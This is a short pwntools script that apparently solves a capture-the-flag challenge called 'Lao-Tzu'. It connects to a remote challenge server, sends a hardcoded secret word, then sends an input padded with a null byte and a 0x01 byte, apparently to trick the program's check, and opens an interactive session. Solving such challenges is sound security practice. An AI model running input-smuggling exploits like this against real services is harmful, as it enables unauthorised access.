from pwn import *

context.terminal = ['urxvt','-e','sh','-c']
context.log_level = 'DEBUG'
#for local
#sh = gdb.debug("./Lao-Tzu")
#for remote
sh = remote("poseidonchalls.westeurope.cloudapp.azure.com", 9003)
sh.sendlineafter("Enter the secret for the magic word: ","t0m7r00z")
s = b"t0m7r00z\x00\x01"
sh.sendlineafter("Enter the thing that's in my mind: ",s)
sh.interactive()
